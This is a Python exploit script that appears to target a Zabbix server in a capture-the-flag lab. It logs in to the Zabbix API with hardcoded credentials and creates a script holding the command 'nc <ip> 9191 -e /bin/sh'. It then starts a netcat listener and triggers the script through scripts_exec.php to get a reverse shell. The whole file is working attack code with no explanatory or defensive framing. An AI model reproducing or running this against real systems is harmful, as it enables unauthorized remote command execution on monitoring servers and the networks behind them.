#!/usr/bin/python
import requests
import netifaces as ni
import random, string
import subprocess,sys
import json

ZABIX_ROOT = 'http://10.10.10.108'
url = ZABIX_ROOT + '/zabbix/api_jsonrpc.php'
headers = {'content-type': 'application/json'}

login = 'zapper'
password = 'zapper'
hostid = '10051'

CRED = '\033[91m'
CEND = '\033[0m'

def main():
	try:
		ni.ifaddresses('tun0')
		ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
		port = 9191
	except:
		print '{}[*]{} Failed to retrieve tun0 IP address. Is your VPN on?'.format(CRED,CEND)
                sys.exit()

	auth = getAuth() # Get authentication ID in JSON format
	scriptid = createScript(auth,ip) # Create script and return its ID
	netcat() # Start netcat handler
	executeScript(scriptid) # Execute the created script

def getAuth():
	payload = {
   		"jsonrpc" : "2.0",
    		"method" : "user.login",
    		"params": {
    			'user': ""+login+"",
    			'password': ""+password+"",
    			},
   		"auth" : None,
    		"id" : 0,
	}

	try:
		auth = requests.post(url, data=json.dumps(payload), headers=(headers),timeout=5)
	except requests.exceptions.Timeout:
		print '{}[*]{} Failed to fetch authentication ID, please reset the box. Exiting...'.format(CRED,CEND)
		sys.exit()

	auth = auth.json()
	return auth['result']

def createScript(auth,ip):
	scriptname = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.digits) for _ in range(7))

	payload = {
		"jsonrpc": "2.0",
		"method": "script.create",
		"params": {
			"name": "{}".format(scriptname),
			"command": "nc {} 9191 -e /bin/sh".format(ip)
			},
			"auth" : auth,
			"id" : 0,
		}

	cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers))
	cmd_upd = cmd_upd.json()
	scriptid = "".join(cmd_upd['result']['scriptids'])

	return scriptid

def executeScript(scriptid):
	params = (
    	('hostid', '10106'),
    	('scriptid', '{}'.format(scriptid)),
    	('sid', '55b4c51e290d34c9'),
	)

	response = requests.get('http://10.10.10.108/zabbix/scripts_exec.php', params=params)

def netcat():
	try:
		subprocess.Popen(["nc -lvnp 9191"], shell=True, stderr=subprocess.STDOUT)
	except:
		print '{}[*]{} Failed to start netcat handler. Exiting...'.format(CRED,CEND)
		sys.exit()

if __name__ == "__main__":
	main()
